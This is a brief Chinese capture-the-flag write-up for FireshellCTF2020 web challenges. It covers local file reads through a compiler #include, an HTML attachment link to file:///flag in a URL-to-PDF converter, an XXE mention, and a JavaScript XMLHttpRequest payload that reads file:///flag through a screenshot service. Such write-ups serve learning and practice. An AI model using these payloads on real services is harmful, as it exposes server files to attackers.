# FireshellCTF2020

## Caas

还蛮有意思的，可以在线编译c/c++

应该是调用服务器上gcc

编译的时候会出啥岔子呢

原题提示``/flag`` 那么考虑能不能LFI

``#include``试下

然后在报错信息里看到了flag

## URL TO PDF

buuoj不能连外网么法看，这题复现的wp

https://blog.shoebpatel.com/2020/03/23/FireShell-CTF-2020-Write-up/

就是html转pdf的时的attachment

开个靶机然后设置一个这样的网页

```
<!DOCTYPE html>
<html>
<head>
<title>Captain</title>
</head>
<body>
<a>"222"</a>
<a rel='attachment' href='file:///flag'>233</a>
</body>
```

貌似是因为后端在转pdf的时候会执行html里的指令，然后把flag带出来了

然后用kali的pdfdetach分离出pdf里的attachment

## Car

一个基础XXE

## ScreenShooter

和URL TO PDF类似的思路

这里利用javascript去读

```javascript
exp=new XMLHttpRequest;exp.onload=function(){document.write(this.responseText)};exp.open("GET","file:///flag");exp.send();
```

